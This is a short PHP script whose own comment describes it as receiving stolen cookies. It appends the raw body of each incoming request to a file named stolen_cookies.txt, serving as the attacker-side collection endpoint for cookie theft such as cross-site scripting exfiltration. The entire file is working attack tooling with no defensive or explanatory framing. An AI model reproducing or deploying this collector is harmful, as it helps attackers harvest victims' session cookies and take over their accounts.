<?php

/**
 * PHP script to receive to stolen cookie and write the data to the stolen_cookies.txt
 */
$stolenCookieFile = 'stolen_cookies.txt';
$fh = fopen($stolenCookieFile, 'a+') or die("Cannot open file");

$contentType = isset($_SERVER["CONTENT_TYPE"]) ? trim($_SERVER["CONTENT_TYPE"]) : '';
$content = trim(file_get_contents("php://input"));
fwrite($fh, $content);
fwrite($fh, "\n");
fclose($fh);